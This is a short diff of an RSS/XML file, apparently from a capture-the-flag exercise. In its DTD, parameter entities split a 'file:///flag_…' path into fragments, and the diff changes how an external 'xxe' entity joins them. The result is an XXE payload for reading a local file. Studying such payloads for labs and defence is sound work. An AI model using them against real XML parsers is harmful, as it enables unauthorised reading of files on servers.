@@ -3,7 +3,7 @@
 <!ENTITY % first "fil">
 <!ENTITY % second "e:///fla">
 <!ENTITY % third "g_c56834fa586bd69dd62140979a729f94">
-<!ENTITY xxe SYSTEM "%first;%second;%third;"
+<!ENTITY xxe SYSTEM "@{@string/%first; + @string/%second; + @string/%third;}"
  >]>
 <rss version="2.0"
 	xmlns:content="http://purl.org/rss/1.0/modules/content/"
